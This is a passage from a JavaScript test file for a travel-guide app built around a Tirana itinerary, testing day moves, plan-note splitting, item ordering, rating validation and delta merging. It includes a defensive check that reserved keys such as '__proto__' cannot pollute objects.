// interesting failure mode is not "throws": it's a typo'd or renamed TABS id
// this test would catch by checking membership in the real, exported list.
test('tabForSection resolves every real Tirana section (and so every item) to one of the five tabs', () => {
  const fs = require('fs');
  const path = require('path');
  const tirana = JSON.parse(fs.readFileSync(path.join(__dirname, '..', 'cities', 'tirana.json'), 'utf8'));
  const tabIds = C.TABS.map(t => t.id);
  const secById = {};
  tirana.sections.forEach(s => { secById[s.id] = s; });
  tirana.sections.forEach(s => {
    const tab = C.tabForSection(s);
    assert.ok(tabIds.indexOf(tab) !== -1,
      `section "${s.id}" (${s.label}) resolved to "${tab}", not one of ${tabIds.join('/')}`);
  });
  tirana.items.forEach(it => {
    const sec = secById[it.section];
    assert.ok(sec, `item "${it.id}" references unknown section "${it.section}"`);
    const tab = C.tabForSection(sec);
    assert.ok(tabIds.indexOf(tab) !== -1,
      `item "${it.id}" (section "${it.section}") resolved to "${tab}", not one of ${tabIds.join('/')}`);
  });
});

// --- Plan tab per-item day moves: the picker's pure model ---
// The move mechanism itself (setDay + keyForDisplayedDate) already had
// coverage; what was missing is the model that tells the renderer which day
// the item is ALREADY on, so that day can be shown but not offered as a tap
// that cannot change anything.
test('dayMoveOptions covers the whole stay and marks the day the item is on', () => {
  const st = C.emptyState();
  const brasserie = GOOD.items.find(i => i.id === 'brasserie'); // day 2026-08-13
  const m = C.dayMoveOptions(GOOD, st, brasserie);
  assert.equal(m.options.length, 8); // every date of the stay
  assert.equal(m.hasDay, true);
  assert.equal(m.currentIso, '2026-08-13');
  assert.ok(/\b13\b/.test(m.currentLabel), 'currentLabel should name the date: ' + m.currentLabel);
  const current = m.options.filter(o => o.current);
  assert.equal(current.length, 1);
  assert.equal(current[0].iso, '2026-08-13');
  // Every other date stays a live target.
  assert.equal(m.options.filter(o => !o.current).length, 7);
});
test('dayMoveOptions has no current day for an item with no day assigned', () => {
  const st = C.emptyState();
  const sisters = GOOD.items.find(i => i.id === 'sisters'); // backup, no day
  const m = C.dayMoveOptions(GOOD, st, sisters);
  assert.equal(m.hasDay, false);
  assert.equal(m.currentIso, null);
  assert.equal(m.currentLabel, null);
  assert.equal(m.options.filter(o => o.current).length, 0);
});
test('dayMoveOptions marks the DISPLAYED day, not the stored key, after a reorder', () => {
  // brasserie's stored day is Aug 13, but the reorder puts its group in the
  // Aug 10 slot: the traveler sees the card under Aug 10, so that is the day
  // the picker must call "current".
  const st = C.emptyState();
  st.dayOrder.dinner = ['2026-08-13', '2026-08-10'];
  const brasserie = GOOD.items.find(i => i.id === 'brasserie');
  const m = C.dayMoveOptions(GOOD, st, brasserie);
  assert.equal(m.currentIso, '2026-08-10');
  assert.equal(m.options.find(o => o.iso === '2026-08-10').key, '2026-08-13');
  assert.equal(m.options.filter(o => o.current).length, 1);
});
test('dayMoveOptions tracks an in-app move (state override beats the data day)', () => {
  const st = C.emptyState();
  const brasserie = GOOD.items.find(i => i.id === 'brasserie');
  C.setDay(st, 'brasserie', '2026-08-09');
  const m = C.dayMoveOptions(GOOD, st, brasserie);
  assert.equal(m.currentIso, '2026-08-09');
  assert.equal(m.options.filter(o => o.current).length, 1);
});
test('dayMoveOptions respects an adjusted stay range', () => {
  const st = C.emptyState();
  C.setStayDates(st, '2026-08-09', '2026-08-11');
  const brasserie = GOOD.items.find(i => i.id === 'brasserie'); // Aug 13, now outside
  const m = C.dayMoveOptions(GOOD, st, brasserie);
  assert.equal(m.options.length, 3);
  assert.equal(m.hasDay, true);
  assert.equal(m.currentIso, null); // its day is off the shortened stay: nothing to mark
});
// Integration guard on the real trip data this feature was built for: every
// dated Tirana item must offer exactly one marked current day and seven live
// targets, whatever section it lives in.
test('dayMoveOptions works for every dated item in the real Tirana guide', () => {
  const fs = require('fs');
  const path = require('path');
  const tirana = JSON.parse(fs.readFileSync(path.join(__dirname, '..', 'cities', 'tirana.json'), 'utf8'));
  const st = C.emptyState();
  const dated = tirana.items.filter(i => i.day && (i.status === 'plan' || i.status === 'done'));
  assert.ok(dated.length > 0);
  dated.forEach(it => {
    const m = C.dayMoveOptions(tirana, st, it);
    assert.equal(m.options.length, 8, `${it.id}: expected the 8-day stay`);
    assert.equal(m.hasDay, true, `${it.id}: should read as dated`);
    assert.equal(m.options.filter(o => o.current).length, 1,
      `${it.id}: expected exactly one current day, got ${m.options.filter(o => o.current).length}`);
    assert.equal(m.currentIso, it.day, `${it.id}: current day should be its own date`);
    assert.equal(m.options.filter(o => !o.current).length, 7, `${it.id}: expected 7 live targets`);
  });
});

// --- Composite daily-plan split (tools/split-plans.js) ---
// The transform that turned Tirana's eight "one item per day, everything
// packed into the note" entries into individually movable items. The tool is
// a one-off, but its two pure pieces are what a future city (or a re-run
// after an Enrich pass reintroduces a composite) would lean on, and the
// completeness check below is the standing proof that no fragment of the
// original plan was dropped on the floor.
const SPLIT = require('../tools/split-plans');

test('parseFragments splits a composite note on the separator and keeps the phase', () => {
  const f = SPLIT.parseFragments('AM: Coolab day pass · PM: Barber 919 · Eve: Era Blloku');
  assert.equal(f.length, 3);
  assert.deepEqual(f[0], { phase: 'AM', text: 'Coolab day pass' });
  assert.deepEqual(f[1], { phase: 'PM', text: 'Barber 919' });
  assert.deepEqual(f[2], { phase: 'Eve', text: 'Era Blloku' });
});

// The real notes only prefix the FIRST fragment of a run, so an unprefixed
// fragment belongs to the phase before it, not to no phase at all. Getting
// this wrong would silently drop "laundry" out of Tuesday afternoon.
test('parseFragments carries the phase forward across unprefixed fragments', () => {
  const f = SPLIT.parseFragments('AM: market run · PM: Work block · laundry · Eve: dinner');
  assert.deepEqual(f.map(x => x.phase), ['AM', 'PM', 'PM', 'Eve']);
  assert.deepEqual(f.map(x => x.text), ['market run', 'Work block', 'laundry', 'dinner']);
});

test('parseFragments leaves a leading unphased fragment unphased, and drops blanks', () => {
  const f = SPLIT.parseFragments('  wander  ·   · PM: nap ·  ');
  assert.deepEqual(f, [{ phase: null, text: 'wander' }, { phase: 'PM', text: 'nap' }]);
});

test('parseFragments tolerates a missing or non-string note', () => {
  assert.deepEqual(SPLIT.parseFragments(''), []);
  assert.deepEqual(SPLIT.parseFragments(undefined), []);
  assert.deepEqual(SPLIT.parseFragments(null), []);
  assert.deepEqual(SPLIT.parseFragments(42), []);
});

const SPLIT_SPEC = {
  dissolve: ['tanini'],
  merge: [{ id: 'brasserie', when: 'Eve', noteAppend: 'Fallback: Tanini.' },
    { id: 'nord', day: '2026-08-11', when: 'AM' }],
  create: [{ item: { id: 'work-block', section: 'coffee', status: 'plan', name: 'Work block', day: '2026-08-11' } }]
};

test('applySplit dissolves, merges and creates in one pass', () => {
  const out = SPLIT.applySplit(GOOD, SPLIT_SPEC);
  assert.equal(out.items.find(i => i.id === 'tanini'), undefined, 'composite should be gone');
  const br = out.items.find(i => i.id === 'brasserie');
  assert.equal(br.when, 'Eve');
  assert.ok(br.note.endsWith('Fallback: Tanini.'), br.note);
  const nord = out.items.find(i => i.id === 'nord');
  assert.equal(nord.day, '2026-08-11'); // gained a day it did not have
  const wb = out.items.find(i => i.id === 'work-block');
  assert.equal(wb.name, 'Work block');
  assert.equal(out.items.length, GOOD.items.length); // minus one, plus one
});

// The surviving items are the ones the traveler's local state is keyed to.
// A merge that renamed or re-slugged an id would silently orphan their
// statuses, renames and day moves.
test('applySplit never changes a surviving item id, and leaves the input alone', () => {
  const before = JSON.stringify(GOOD);
  const out = SPLIT.applySplit(GOOD, SPLIT_SPEC);
  assert.equal(JSON.stringify(GOOD), before, 'input must not be mutated');
  ['brasserie', 'sisters', 'nord'].forEach(id => {
    assert.ok(out.items.some(i => i.id === id), id + ' should survive with its id');
  });
});

test('applySplit does not append the same note twice when re-run', () => {
  const once = SPLIT.applySplit(GOOD, SPLIT_SPEC);
  const twice = SPLIT.applySplit(once, { merge: SPLIT_SPEC.merge });
  const n = twice.items.find(i => i.id === 'brasserie').note;
  assert.equal(n.split('Fallback: Tanini.').length - 1, 1, n);
});

test('applySplit refuses a spec that has drifted from the data', () => {
  assert.throws(() => SPLIT.applySplit(GOOD, { dissolve: ['nope'] }), /dissolve target not found/);
  assert.throws(() => SPLIT.applySplit(GOOD, { merge: [{ id: 'nope', when: 'AM' }] }), /merge target not found/);
  assert.throws(() => SPLIT.applySplit(GOOD, {
    create: [{ item: { id: 'nord', section: 'coffee', status: 'plan', name: 'Dup' } }]
  }), /collides with an existing item/);
  assert.throws(() => SPLIT.applySplit(GOOD, {
    create: [{ item: { id: 'x', section: 'nosuch', status: 'plan', name: 'X' } }]
  }), /unknown section/);
});

// Completeness: every fragment of the eight original composite notes has to
// map onto a disposition in the spec. Fragments outnumber nothing here, but
// spec rows outnumber fragments, because several fragments chained more than
// one stop behind an arrow or a "then" and were split further.
test('every fragment of the original Tirana composites has a disposition in the spec', () => {
  const spec = SPLIT.TIRANA;
  const rows = [].concat(spec.merge, spec.create, spec.covered)
    .filter(r => r.fragment.indexOf('(day ') !== 0);
  const norm = s => s.toLowerCase().replace(/[^a-z0-9#]+/g, ' ').trim();
  const specTexts = rows.map(r => norm(r.fragment.replace(/^(AM|PM|Eve):\s*/i, '')));
  let fragments = 0;
  spec.originalNotes.forEach(note => {
    SPLIT.parseFragments(note).forEach(f => {
      fragments++;
      const n = norm(f.text);
      assert.ok(specTexts.some(t => t === n || t.indexOf(n) !== -1 || n.indexOf(t) !== -1),
        'no disposition for fragment: ' + f.text);
    });
  });
  assert.equal(fragments, 32);
  assert.equal(rows.length, 36);
  assert.equal(spec.merge.length + spec.create.length + spec.covered.length, 38); // + 2 day-level notes
});

// --- The split applied: the real guide after the transform ---
function tiranaData() {
  const fs = require('fs');
  const path = require('path');
  return JSON.parse(fs.readFileSync(path.join(__dirname, '..', 'cities', 'tirana.json'), 'utf8'));
}

// The tell of a composite is not the separator (a plain address line uses it
// too) but the AM/PM/Eve phase markers: two or more in one note means the
// item is carrying a schedule instead of being one entry in one.
test('no composite daily-plan item survives in the shipped Tirana guide', () => {
  tiranaData().items.forEach(it => {
    const phases = SPLIT.parseFragments(it.note).filter(f => f.phase).length;
    assert.ok(phases < 2,
      `item ${it.id} still packs ${phases} phases into one note: ${it.name}`);
    assert.ok(!/^(Mon|Tue|Wed|Thu|Fri|Sat|Sun) \d{4}-\d{2}-\d{2}$/.test(it.name),
      `item ${it.id} is still named after a whole day: ${it.name}`);
  });
});

// The traveler's actual ask, as a test: Monday is four separate cards, and
// moving one of them moves exactly one.
test('Mon 2026-08-24 is individually controlled items, one per stop', () => {
  const data = tiranaData();
  const pm = C.planModel(data, C.emptyState(), '2026-08-20');
  const mon = pm.days.find(d => d.iso === '2026-08-24');
  const names = mon.items.map(e => e.it.name);
  ['Coolab', 'Ira Shehaj Nails & Podology', 'Barber 919', 'Era Blloku'].forEach(n => {
    assert.ok(names.indexOf(n) !== -1, 'Mon should list ' + n + ', got: ' + names.join(' | '));
  });
  // Distinct items, not one card mentioning four places.
  assert.equal(new Set(mon.items.map(e => e.it.id)).size, mon.items.length);
});

test('moving Barber 919 to another day moves nothing else', () => {
  const data = tiranaData();
  const st = C.emptyState();
  const before = C.planModel(data, st, '2026-08-20');
  const monBefore = before.days.find(d => d.iso === '2026-08-24').items.map(e => e.it.id).sort();
  C.setDay(st, 'services-04', '2026-08-25');
  const after = C.planModel(data, st, '2026-08-20');
  const monAfter = after.days.find(d => d.iso === '2026-08-24').items.map(e => e.it.id).sort();
  const tueAfter = after.days.find(d => d.iso === '2026-08-25').items.map(e => e.it.id);
  assert.deepEqual(monAfter, monBefore.filter(id => id !== 'services-04'));
  assert.ok(tueAfter.indexOf('services-04') !== -1, 'Barber should land on Tue 25');
  // Every other day is byte-identical to before.
  before.days.filter(d => d.iso !== '2026-08-24' && d.iso !== '2026-08-25').forEach(d => {
    const now = after.days.find(x => x.iso === d.iso);
    assert.deepEqual(now.items.map(e => e.it.id), d.items.map(e => e.it.id), d.iso + ' should be untouched');
  });
});

test('Wed 2026-08-26 lists Bunk\'Art 1, Dajti and Mullixhiu as three items', () => {
  const pm = C.planModel(tiranaData(), C.emptyState(), '2026-08-20');
  const wed = pm.days.find(d => d.iso === '2026-08-26');
  const ids = wed.items.map(e => e.it.id);
  ['activities-01', 'activities-02', 'restaurants-03'].forEach(id => {
    assert.ok(ids.indexOf(id) !== -1, 'Wed should list ' + id + ', got: ' + ids.join(','));
  });
});

// A place that appears in the plan must appear ONCE. The whole point of
// merging rather than creating was that Era Blloku is not both a restaurant
// card and a plan card.
// Keyed on name AND day: a recurring chore legitimately repeats across days
// (two work blocks, two ATM pulls), but the same name twice on the same day
// is the duplicate this transform existed to avoid.
test('no venue is duplicated between the plan and its own section', () => {
  const data = tiranaData();
  const seen = {};
  data.items.forEach(it => {
    const key = it.name.toLowerCase().trim() + '@' + (it.day || '-');
    assert.ok(!seen[key],
      'duplicate item "' + it.name + '" on ' + (it.day || 'no day') + ': ' + seen[key] + ' and ' + it.id);
    seen[key] = it.id;
  });
});

// The open-tasks checklist is a separate surface with its own semantics; the
// split was not allowed to disturb it.
test('the Open items checklist is untouched by the split', () => {
  const data = tiranaData();
  const tasks = data.items.filter(i => i.section === 'tasks');
  assert.equal(tasks.length, 9);
  tasks.forEach(t => assert.equal(t.day, undefined, t.id + ' should stay undated'));
  const pm = C.planModel(data, C.emptyState(), '2026-08-20');
  assert.equal(pm.openTasks.length, 9);
});

// The pipeline half of the fix: a future city has to arrive pre-split.
test('PROMPT.md forbids the packed per-day item, inside the sliced item contract', () => {
  const fs = require('fs');
  const path = require('path');
  const prompt = fs.readFileSync(path.join(__dirname, '..', 'PROMPT.md'), 'utf8');
  const block = C.promptKit.sliceLandmark
    ? C.promptKit.sliceLandmark(prompt, 'CONTRACT:ITEM')
    : prompt.split('CONTRACT:ITEM')[1];
  assert.ok(/One item is one thing the traveler does/.test(block),
    'the no-composite rule must live INSIDE CONTRACT:ITEM so the delta prompts carry it too');
  assert.ok(/own `day`/.test(block));
});

test('orderDayItems sinks done items below active, stable both sides', () => {
  const mk = (id, status) => ({ it: { id: id }, sec: {}, status: status });
  const entries = [mk('a', 'done'), mk('b', 'plan'), mk('c', 'done'), mk('d', 'plan')];
  assert.deepEqual(C.orderDayItems(entries, null).map(e => e.it.id), ['b', 'd', 'a', 'c']);
  // custom order applies within the bands: order lists c,b,a,d
  assert.deepEqual(C.orderDayItems(entries, ['c', 'b', 'a', 'd']).map(e => e.it.id), ['b', 'd', 'c', 'a']);
  // un-done returns to its ordered place
  const undone = entries.map(e => e.it.id === 'a' ? mk('a', 'plan') : e);
  assert.deepEqual(C.orderDayItems(undone, ['c', 'b', 'a', 'd']).map(e => e.it.id), ['b', 'a', 'd', 'c']);
});
test('orderDayItems maps are prototype-safe', () => {
  const mk = (id, status) => ({ it: { id: id }, sec: {}, status: status });
  const entries = [mk('__proto__', 'plan'), mk('valueOf', 'plan'), mk('x', 'plan')];
  const out = C.orderDayItems(entries, ['valueOf', '__proto__']);
  assert.deepEqual(out.map(e => e.it.id), ['valueOf', '__proto__', 'x']);
  assert.equal(({}).it, undefined);
});

test('whenClock ranks dayparts and explicit times', () => {
  assert.equal(C.whenClock('AM, coffee crawl 1 of 2'), 540);
  assert.equal(C.whenClock('Eve, seafood'), 1170);
  assert.equal(C.whenClock('PM'), 900);
  assert.equal(C.whenClock('leave 08:45 for the terminal'), 525);
  assert.equal(C.whenClock('lunch after the market'), 720);
  assert.equal(C.whenClock(undefined), 780);
  assert.equal(C.whenClock('tram to Blloku'), 780); // no false am-match inside words
});
test('orderDayItems defaults to chronological, drag order still overrides', () => {
  const mk = (id, when) => ({ it: { id: id, when: when }, sec: {}, status: 'plan' });
  const day = [mk('work', 'PM'), mk('fish', 'Eve, seafood'), mk('coffee', 'AM, crawl'), mk('bus', 'leave 08:45')];
  assert.deepEqual(C.orderDayItems(day, null).map(e => e.it.id), ['bus', 'coffee', 'work', 'fish']);
  assert.deepEqual(C.orderDayItems(day, ['fish', 'work']).map(e => e.it.id), ['fish', 'work', 'bus', 'coffee']);
});

// ---- structured ratings ----
// The rating is the one field the traveler reads at a glance to choose
// between two places, so every entry path (whole guide, new delta item,
// ratings map) is held to the same bar and the bad shapes are named.
test('validate accepts a well-formed rating and every optional field', () => {
  const ok = clone(GOOD);
  ok.items[0].rating = { stars: 4.8, count: 5545, source: 'Google Maps, Aug 2026', checked: '2026-08-25' };
  ok.items[1].rating = { stars: 5 };                       // stars alone is enough
  ok.items[2].rating = { stars: 0, count: 0, source: null, checked: null };
  assert.deepEqual(C.validate(ok), []);
});

test('validate rejects every bad rating shape by name', () => {
  function errsFor(rating) {
    const bad = clone(GOOD);
    bad.items[0].rating = rating;
    return C.validate(bad);
  }
  assert.ok(errsFor([4.8]).some((e) => /rating: must be an object/.test(e)));
  assert.ok(errsFor('4.8 stars').some((e) => /rating: must be an object/.test(e)));
  assert.ok(errsFor({}).some((e) => /rating: stars must be a number from 0 to 5/.test(e)));
  assert.ok(errsFor({ stars: '4.8' }).some((e) => /stars must be a number from 0 to 5/.test(e)));
  assert.ok(errsFor({ stars: 5.4 }).some((e) => /stars must be a number from 0 to 5/.test(e)));
  assert.ok(errsFor({ stars: -1 }).some((e) => /stars must be a number from 0 to 5/.test(e)));
  assert.ok(errsFor({ stars: NaN }).some((e) => /stars must be a number from 0 to 5/.test(e)));
  assert.ok(errsFor({ stars: 4.8, count: 12.5 }).some((e) => /count must be a whole number, 0 or more/.test(e)));
  assert.ok(errsFor({ stars: 4.8, count: '442' }).some((e) => /count must be a whole number, 0 or more/.test(e)));
  assert.ok(errsFor({ stars: 4.8, count: -3 }).some((e) => /count must be a whole number, 0 or more/.test(e)));
  assert.ok(errsFor({ stars: 4.8, source: 12 }).some((e) => /rating: source must be a string/.test(e)));
  assert.ok(errsFor({ stars: 4.8, checked: 'Aug 2026' }).some((e) => /rating: checked must be YYYY-MM-DD/.test(e)));
  // The error names the item, exactly like every other item-level error.
  assert.ok(errsFor({ stars: 9 }).some((e) => /^items\[0\] \(brasserie\) rating:/.test(e)));
  // null and absent are both "no rating", never an error.
  assert.deepEqual(errsFor(null), []);
});

test('mergeDelta accepts a rating on a new item, held to the same bar', () => {
  const delta = { schema: 1, delta: true, items: [
    { id: 'nova', section: 'dinner', status: 'plan', name: 'Nova', links: [],
      rating: { stars: 4.6, count: 210, source: 'Google Maps, Aug 2026', checked: '2026-08-25' } }
  ] };
  const r = C.mergeDelta(GOOD, delta);
  assert.deepEqual(r.errors, []);
  assert.deepEqual(r.data.items[4].rating,
    { stars: 4.6, count: 210, source: 'Google Maps, Aug 2026', checked: '2026-08-25' });
  const badItem = { schema: 1, delta: true, items: [
    { id: 'nova', section: 'dinner', status: 'plan', name: 'Nova', links: [], rating: { stars: 7 } }
  ] };
  const bad = C.mergeDelta(GOOD, badItem);
  assert.equal(bad.data, null);
  assert.ok(bad.errors.some((e) => /items\[0\] \(nova\) rating: stars must be a number from 0 to 5/.test(e)));
});

test('mergeDelta ratings map applies to existing items and counts unknown ids as skipped', () => {
  const delta = { schema: 1, delta: true, ratings: {
    brasserie: { stars: 4.8, count: 1216, source: 'Google Maps, Aug 2026', checked: '2026-08-25' },
    nord: { stars: 4.4 },
    'vanished-place': { stars: 4.9, count: 12 }
  } };
  const r = C.mergeDelta(GOOD, delta);
  assert.deepEqual(r.errors, []);
  assert.equal(r.summary.ratingsApplied, 2);
  assert.equal(r.summary.ratingsSkipped, 1);
  const byId = {};
  r.data.items.forEach((i) => { byId[i.id] = i; });
  assert.equal(byId.brasserie.rating.count, 1216);
  assert.equal(byId.nord.rating.stars, 4.4);
  assert.equal(byId.tanini.rating, undefined);
  // Nothing else on the item moved: a ratings pass touches `rating` only.
  assert.equal(byId.brasserie.note, GOOD.items[0].note);
  assert.equal(byId.brasserie.price.text, GOOD.items[0].price.text);
  // Pure: the input city is untouched and the map is deep-copied, not aliased.
  assert.equal(GOOD.items[0].rating, undefined);
  delta.ratings.brasserie.stars = 1;
  assert.equal(byId.brasserie.rating.stars, 4.8);
});

test('mergeDelta ratings applied twice REPLACES and counts as applied, not skipped', () => {
  // A rating is a reading taken on a date. Re-running the pass is how the
  // number stays current, so the second run must overwrite the first and
  // report the work it did; skipped is reserved for ids this guide lacks.
  const first = C.mergeDelta(GOOD, { schema: 1, delta: true,
    ratings: { brasserie: { stars: 4.8, count: 1216, checked: '2026-07-01' } } });
  const second = C.mergeDelta(first.data, { schema: 1, delta: true,
    ratings: { brasserie: { stars: 4.6, count: 1290, checked: '2026-08-25' } } });
  assert.deepEqual(second.errors, []);
  assert.equal(second.summary.ratingsApplied, 1);
  assert.equal(second.summary.ratingsSkipped, 0);
  assert.deepEqual(second.data.items[0].rating, { stars: 4.6, count: 1290, checked: '2026-08-25' });
  // Replacement, not a field-by-field merge: last month's count cannot
  // survive next to this month's stars.
  const third = C.mergeDelta(second.data, { schema: 1, delta: true,
    ratings: { brasserie: { stars: 4.7 } } });
  assert.deepEqual(third.data.items[0].rating, { stars: 4.7 });
});

test('mergeDelta ratings map is prototype-safe and rejects bad shapes', () => {
  // JSON.parse, not an object literal: a literal `__proto__:` key SETS the
  // prototype instead of creating an own property, so a literal would test
  // nothing. A pasted delta arrives through JSON.parse, and that is the
  // route that really does hand mergeDelta an own "__proto__" key.
  const hostile = C.mergeDelta(GOOD, JSON.parse('{"schema":1,"delta":true,"ratings":' +
    '{"__proto__":{"stars":5},"constructor":{"stars":5},"hasOwnProperty":{"stars":5},' +
    '"brasserie":{"stars":4.1}}}'));
  assert.deepEqual(hostile.errors, []);
  // No reserved key reaches an item, and nothing is painted onto Object.
  assert.equal(hostile.summary.ratingsApplied, 1);
  assert.equal(hostile.summary.ratingsSkipped, 3);
  assert.equal(({}).rating, undefined);
  assert.equal(({}).stars, undefined);
  hostile.data.items.forEach((it) => {
    if (it.id !== 'brasserie') assert.equal(it.rating, undefined);
  });
  const arr = C.mergeDelta(GOOD, { schema: 1, delta: true, ratings: [{ stars: 4 }] });
  assert.equal(arr.data, null);
  assert.ok(arr.errors.some((e) => /ratings must be an object keyed by item id/.test(e)));
  const badEntry = C.mergeDelta(GOOD, { schema: 1, delta: true, ratings: { nord: { stars: 'nine' } } });
  assert.equal(badEntry.data, null);
  assert.ok(badEntry.errors.some((e) => /ratings\["nord"\]: stars must be a number from 0 to 5/.test(e)));
  // Errors mean NO merge at all, ratings included.
  assert.deepEqual(badEntry.summary, { added: 0, skipped: 0, sectionsAdded: 0, intelApplied: 0,
    intelSkipped: 0, ratingsApplied: 0, ratingsSkipped: 0 });
});

test('mergeDelta applies intel and ratings in one payload without either disturbing the other', () => {
  const r = C.mergeDelta(GOOD, { schema: 1, delta: true,
    intel: { brasserie: { verdicts: [{ tier: 'must', text: 'The duck' }] } },
    ratings: { brasserie: { stars: 4.8 }, nowhere: { stars: 4.0 } } });
  assert.deepEqual(r.errors, []);
  assert.equal(r.summary.intelApplied, 1);
  assert.equal(r.summary.intelSkipped, 0);
  assert.equal(r.summary.ratingsApplied, 1);
  assert.equal(r.summary.ratingsSkipped, 1);
  assert.equal(r.data.items[0].intel.verdicts[0].text, 'The duck');
  assert.equal(r.data.items[0].rating.stars, 4.8);
});

test('buildRatingsPassPrompt lists the items still in play and nothing else', () => {
  const city = clone(GOOD);
  city.items.push({ id: 'gone', section: 'dinner', status: 'archived', name: 'Closed Place', links: [] });
  city.items.push({ id: 'eaten', section: 'dinner', status: 'done', name: 'Already Been', links: [] });
  const out = C.promptKit.buildRatingsPassPrompt(FAKE_RERUN, city);
  assert.ok(out.startsWith('You are refreshing the Google Maps ratings on an existing CityOps city guide.'));
  assert.ok(out.includes('- **City:** Batumi'));
  assert.ok(out.includes('Look up the CURRENT Google Maps rating for each item listed below.'));
  assert.equal(out.indexOf('RERUN:RATINGS'), -1);
  assert.ok(out.includes('## Items'));
  assert.ok(out.includes('- brasserie | dinner | Brasserie 1900'));   // plan
  assert.ok(out.includes('- sisters | dinner | At the Sisters'));     // backup
  assert.equal(out.indexOf('- gone | dinner | Closed Place'), -1);    // archived
  assert.equal(out.indexOf('- eaten | dinner | Already Been'), -1);   // done
  assert.ok(out.includes('Each `- ` line above is `id | section | name`.'));
  // Not an intel pass and not an interests pass: neither block belongs here.
  assert.equal(out.indexOf('## Intel quality rules'), -1);
  assert.equal(out.indexOf('## Traveler interests'), -1);
  // Pure, like its two siblings.
  const snap = JSON.stringify(city);
  C.promptKit.buildRatingsPassPrompt(FAKE_RERUN, city);
  assert.equal(JSON.stringify(city), snap);
  assert.throws(() => C.promptKit.buildRatingsPassPrompt('# nothing here', GOOD), /no RERUN:RATINGS block/);
});

test('the real PROMPT.md builds a ratings pass that says look it up, never guess', () => {
  const fs = require('fs');
  const path = require('path');
  const prompt = fs.readFileSync(path.join(__dirname, '..', 'PROMPT.md'), 'utf8');
  const out = C.promptKit.buildRatingsPassPrompt(prompt, GOOD);
  assert.ok(out.includes('Never guess, never carry a number forward from memory.'));
  assert.ok(out.includes('Omit any item you cannot verify.'));
  assert.ok(out.includes('"ratings": {'));
  assert.ok(out.includes('- brasserie | dinner | Brasserie 1900'));
  // The generation contract must tell the AI to emit `rating` rather than
  // bury the number in the note, or the badge is empty on every new guide.
  const contract = prompt.slice(prompt.indexOf('<' + '!-- CONTRACT:ITEM -->'),
    prompt.indexOf('<' + '!-- /CONTRACT:ITEM -->'));
  assert.ok(/`rating` is optional on any item and is the ONLY place a rating belongs/.test(contract),
    'the rating rule must live INSIDE CONTRACT:ITEM so the delta prompts carry it too');
});

// ---- Section tabs: chronological default, done at the bottom, drag override ----
// The section-tab twin of the Plan tab's orderDayItems. Entries here are
// {it, dayIso, status} rows, since a section spans the whole trip.
function secEntry(id, dayIso, when, status) {
  return { it: { id: id, when: when }, dayIso: dayIso || null, status: status || 'plan' };
}

test('orderSectionItems runs dated items in date order, undated last', () => {
  const out = C.orderSectionItems([
    secEntry('u1', null),
    secEntry('wed', '2026-08-12'),
    secEntry('u2', null),
    secEntry('mon', '2026-08-10')
  ], []).map((e) => e.it.id);
  assert.deepEqual(out, ['mon', 'wed', 'u1', 'u2']);
});

test('orderSectionItems sorts one date by whenClock, exactly as a Plan day does', () => {
  const out = C.orderSectionItems([
    secEntry('eve', '2026-08-10', 'Dinner'),
    secEntry('am', '2026-08-10', 'Morning coffee'),
    secEntry('clock', '2026-08-10', 'leave 08:45'),
    secEntry('pm', '2026-08-10', 'Afternoon')
  ], []).map((e) => e.it.id);
  assert.deepEqual(out, ['clock', 'am', 'pm', 'eve']);
});

test('orderSectionItems keeps undated items in the guide order, never re-sorted', () => {
  const out = C.orderSectionItems([
    secEntry('zeta', null, 'Evening'),
    secEntry('alpha', null, 'Morning')
  ], []).map((e) => e.it.id);
  assert.deepEqual(out, ['zeta', 'alpha']);
});

test('orderSectionItems sinks done items to the bottom, stable on both sides', () => {
  const out = C.orderSectionItems([
    secEntry('a', '2026-08-10', null, 'done'),
    secEntry('b', '2026-08-11'),
    secEntry('c', '2026-08-12', null, 'done'),
    secEntry('d', '2026-08-13')
  ], []).map((e) => e.it.id);
  assert.deepEqual(out, ['b', 'd', 'a', 'c']);
});

test('orderSectionItems lets a saved order win, with unknown ids keeping the tail', () => {
  const entries = [
    secEntry('mon', '2026-08-10'),
    secEntry('tue', '2026-08-11'),
    secEntry('fresh', '2026-08-09')
  ];
  const out = C.orderSectionItems(entries, ['tue', 'mon']).map((e) => e.it.id);
  assert.deepEqual(out, ['tue', 'mon', 'fresh']);
  // Stale ids in the saved order are ignored, not fatal: an item the traveler
  // archived weeks ago must not cost the section its arrangement.
  const out2 = C.orderSectionItems(entries, ['ghost', 'tue', 'ghost', 'mon']).map((e) => e.it.id);
  assert.deepEqual(out2, ['tue', 'mon', 'fresh']);
});

test('orderSectionItems sinks done items even when a drag put one on top', () => {
  const out = C.orderSectionItems([
    secEntry('a', '2026-08-10', null, 'done'),
    secEntry('b', '2026-08-11')
  ], ['a', 'b']).map((e) => e.it.id);
  assert.deepEqual(out, ['b', 'a']);
});

test('setSectionItemOrder cleans ids and drops the key when nothing is left', () => {
  const st = C.normalizeState({});
  C.setSectionItemOrder(st, 'dinner', ['a', 'b', 'a', '', null, 'c']);
  assert.deepEqual(st.sectionItemOrder.dinner, ['a', 'b', 'c']);
  assert.deepEqual(C.sectionItemOrderFor(st, 'dinner'), ['a', 'b', 'c']);
  C.setSectionItemOrder(st, 'dinner', []);
  assert.equal(Object.prototype.hasOwnProperty.call(st.sectionItemOrder, 'dinner'), false);
  assert.deepEqual(C.sectionItemOrderFor(st, 'dinner'), []);
  assert.throws(() => C.setSectionItemOrder(st, '', ['a']));
});

test('a state written before section order existed normalizes to no arrangement', () => {
  const st = C.normalizeState({ itemStatus: {} });
  assert.deepEqual(st.sectionItemOrder, {});
  assert.deepEqual(C.sectionItemOrderFor(st, 'anything'), []);
});

test('dayItemOrder and sectionItemOrder are separate key spaces, not one map', () => {
  const st = C.normalizeState({});
  C.setDayItemOrder(st, '2026-08-10', ['x', 'y']);
  C.setSectionItemOrder(st, 'dinner', ['y', 'x']);
  assert.deepEqual(st.dayItemOrder['2026-08-10'], ['x', 'y']);
  assert.deepEqual(st.sectionItemOrder.dinner, ['y', 'x']);
});

// ---- Plan tab tasks: done, open, and declined ----
// Declining a task writes the EXISTING archived status; the Plan tab is the
// one surface that reads archived task items back out.
const TASKY = {
  schema: 1,
  city: { name: 'Tirana', country: 'AL',
    dates: { from: '2026-08-22', to: '2026-08-25' },
    accommodation: { name: 'Stay', lat: 41.3, lng: 19.8 } },
  sections: [
    { id: 'tasks', label: 'Tasks', icon: '✅' },
    { id: 'dinner', label: 'Dinner', icon: '🍽️' }
  ],
  items: [
    { id: 't-open', section: 'tasks', status: 'plan', name: 'Book the barber', links: [] },
